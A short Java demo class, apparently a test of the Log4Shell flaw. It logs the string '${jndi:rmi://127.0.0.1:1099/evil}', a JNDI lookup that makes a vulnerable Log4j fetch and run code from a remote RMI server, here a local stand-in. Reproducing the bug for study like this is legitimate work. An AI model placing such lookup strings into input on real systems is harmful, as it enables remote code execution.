package com.eric.javaDemo.log4jTest;

import lombok.extern.slf4j.Slf4j;

@Slf4j
public class Log4jTest {


    public static void main(String[] args) {

//        String name = "${java:vm}";

        String name = "${jndi:rmi://127.0.0.1:1099/evil}";

        log.error("Hello, {}!", name);
    }
}
